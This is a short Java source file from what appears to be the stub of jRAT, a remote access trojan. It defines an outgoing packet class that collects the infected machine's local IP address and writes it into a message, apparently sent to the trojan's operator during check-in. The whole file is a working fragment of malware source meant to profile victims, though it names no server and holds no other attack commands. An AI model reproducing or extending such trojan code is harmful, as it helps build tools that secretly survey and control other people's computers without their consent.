package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;
import java.net.InetAddress;

import se.jrat.common.io.StringWriter;


public class Packet12InitLocalAddress extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		String address; 
		
		try {
			address = InetAddress.getLocalHost().getHostAddress();
		} catch (Exception e) {
			address = "Unknown";
		}
		
		sw.writeLine(address);
	}

	@Override
	public byte getPacketId() {
		return (byte) 12;
	}
}